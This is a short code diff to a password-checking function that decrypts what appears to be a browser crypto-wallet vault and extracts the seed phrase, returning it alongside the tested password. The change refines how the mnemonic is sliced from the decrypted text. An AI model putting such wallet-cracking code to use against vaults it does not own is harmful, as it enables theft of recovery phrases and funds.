@@ -37,7 +37,9 @@ def check_password(info, passwd):
     decrypted_block = AES.new(key, AES.MODE_GCM, nonce=iv).decrypt(vault)
     try:
         if decrypted_block.decode('utf-8', 'ignore').__contains__('"mnemonic":"'):
-            mnemonic = decrypted_block.decode('utf-8', 'ignore')[43:][:77]
+            xuy = decrypted_block.decode('utf-8', 'ignore').find('"mnemonic":"') + 12
+            xuy2 = decrypted_block.decode('utf-8', 'ignore').find('","numberOfAccounts"') - 43
+            mnemonic = decrypted_block.decode('utf-8', 'ignore')[xuy:][:xuy2]
             return f"Mnemonic: {mnemonic}\nPassword: {passwd}"
         else:
             return None
